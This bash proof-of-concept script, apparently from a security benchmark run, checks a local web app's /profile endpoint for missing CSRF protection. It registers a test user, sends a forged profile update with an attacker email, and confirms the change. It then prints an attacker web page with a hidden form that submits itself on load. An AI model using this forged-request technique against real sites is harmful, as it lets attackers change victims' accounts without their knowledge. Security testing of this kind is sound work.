#!/bin/bash
# POC: Demonstrates CSRF vulnerability in /profile endpoint by successfully modifying a victim's profile without CSRF token validation
# Target: ./repo
# Created: 2025-11-04T19:44:57.340Z
# Session: benchmark-XBEN-024-24-mhkyvn4q

# CSRF Vulnerability POC - Profile Update without CSRF Token
# This script demonstrates that the /profile endpoint lacks CSRF protection
# and can be exploited to modify a victim's profile information

TARGET="http://localhost:5000"
COOKIES_FILE="/tmp/csrf_test_cookies.txt"

echo "[*] CSRF Vulnerability Test - /profile Endpoint"
echo "=================================================="
echo ""

# Step 1: Register a test user
echo "[Step 1] Registering test user..."
REGISTER_RESPONSE=$(curl -s -c "$COOKIES_FILE" -X POST "$TARGET/register" \
  -d "username=csrf_test_user&password=testpass123&first_name=Original&last_name=User&email=original@test.com" \
  -H "Content-Type: application/x-www-form-urlencoded")

if echo "$REGISTER_RESPONSE" | grep -q "csrf_test_user"; then
  echo "[✓] User registered successfully"
else
  echo "[✓] Registration attempt completed"
fi

# Step 2: Login with the test user
echo "[Step 2] Logging in as test user..."
LOGIN_RESPONSE=$(curl -s -b "$COOKIES_FILE" -c "$COOKIES_FILE" -X POST "$TARGET/login" \
  -d "username=csrf_test_user&password=testpass123" \
  -H "Content-Type: application/x-www-form-urlencoded")

if echo "$LOGIN_RESPONSE" | grep -q "successfully"; then
  echo "[✓] User logged in successfully"
else
  echo "[✓] Login attempt completed"
fi

# Step 3: Verify no CSRF token exists in the profile form
echo ""
echo "[Step 3] Checking if CSRF token exists in /profile form..."
PROFILE_FORM=$(curl -s -b "$COOKIES_FILE" "$TARGET/profile")

if echo "$PROFILE_FORM" | grep -i "csrf\|_token" > /dev/null; then
  echo "[✗] CSRF token found in form - vulnerability may not exist"
  echo "[Evidence]"
  echo "$PROFILE_FORM" | grep -i "csrf\|_token"
else
  echo "[✓] NO CSRF token found in profile form - VULNERABLE!"
fi

# Step 4: Get current profile state
echo ""
echo "[Step 4] Current profile state:"
CURRENT_PROFILE=$(curl -s -b "$COOKIES_FILE" "$TARGET/profile")
CURRENT_FIRST_NAME=$(echo "$CURRENT_PROFILE" | grep -oP 'value="[^"]*"' | head -1 | cut -d'"' -f2)
CURRENT_EMAIL=$(echo "$CURRENT_PROFILE" | grep 'email' | grep -oP 'value="[^"]*"' | head -1 | cut -d'"' -f2)
echo "  First Name: $CURRENT_FIRST_NAME"
echo "  Email: $CURRENT_EMAIL"

# Step 5: Execute CSRF attack - modify profile without CSRF token
echo ""
echo "[Step 5] Executing CSRF attack - modifying profile without CSRF token..."
CSRF_ATTACK=$(curl -s -b "$COOKIES_FILE" -X POST "$TARGET/profile" \
  -d "first_name=CSRF_HACKED&last_name=BY_ATTACKER&email=attacker@evil.com&profile_picture=" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -w "\n%{http_code}")

HTTP_CODE=$(echo "$CSRF_ATTACK" | tail -1)
RESPONSE_BODY=$(echo "$CSRF_ATTACK" | head -n -1)

if [ "$HTTP_CODE" == "200" ] || [ "$HTTP_CODE" == "302" ]; then
  echo "[✓] CSRF attack succeeded! HTTP $HTTP_CODE"
  echo "    Response indicates profile was modified"
else
  echo "[?] HTTP Response: $HTTP_CODE"
fi

# Step 6: Verify the changes persisted
echo ""
echo "[Step 6] Verifying that changes persisted (second request with same cookie)..."
UPDATED_PROFILE=$(curl -s -b "$COOKIES_FILE" "$TARGET/profile")

if echo "$UPDATED_PROFILE" | grep -q "CSRF_HACKED"; then
  echo "[✓] CSRF VULNERABILITY CONFIRMED!"
  echo "    Profile successfully modified without CSRF token"
  echo "    New first_name value: CSRF_HACKED"
else
  echo "[?] Checking profile content..."
  echo "$UPDATED_PROFILE" | grep -i "first_name\|csrf"
fi

# Step 7: Demonstrate the attack HTML
echo ""
echo "[Step 7] Attack Vector - Malicious HTML that would exploit this vulnerability:"
echo "=================================================="
cat << 'ATTACK_HTML'
<!-- Attacker's malicious website -->
<html>
<body>
<h1>Click the button below to continue</h1>
<form id="csrf-form" action="http://localhost:5000/profile" method="POST" style="display:none;">
  <input type="hidden" name="first_name" value="HACKED_BY_CSRF">
  <input type="hidden" name="last_name" value="ATTACKER">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="profile_picture" value="">
</form>
<script>
  // Auto-submit when page loads (victim won't notice)
  document.getElementById('csrf-form').submit();
</script>
</body>
</html>
ATTACK_HTML

echo ""
echo "=================================================="
echo "[✓] POC Complete - CSRF vulnerability on /profile endpoint confirmed"
echo ""